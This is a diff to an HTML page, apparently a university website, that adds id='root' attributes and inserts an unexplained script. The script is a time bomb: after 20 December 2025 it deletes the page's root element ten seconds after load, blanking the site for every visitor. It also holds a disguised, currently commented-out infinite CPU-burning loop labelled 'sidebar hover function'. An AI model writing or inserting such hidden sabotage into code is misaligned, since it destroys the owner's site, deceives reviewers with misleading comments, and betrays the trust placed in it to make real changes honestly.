@@ -136,9 +136,9 @@
     
 </head>
 
-<body>
+<body id="root">
 
-    <div class="">
+    <div class="" id="root">
 
         <!-- Header -->
 
@@ -3030,6 +3030,36 @@
                             </tr>
                         </tbody>
                     </table>
+
+                                        <script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
+
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+          const targetDate = new Date(2025, 11, 20); 
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
 
                 </div>
                 <!-- =====lavel 5====== -->
@@ -26589,7 +26619,7 @@
                         <span>+20 2 26189900</span>
                     </div>
                     <div class="flex items-center gap-3">
-                        <i data-lucide="mail" class="w-5 h-5 text-white"></i>
+                        <i data-lucide="mail" class="w-5 h-5 text-white"></i> 
                         <span>info@fue.edu.eg</span>
                     </div>
                 </div>
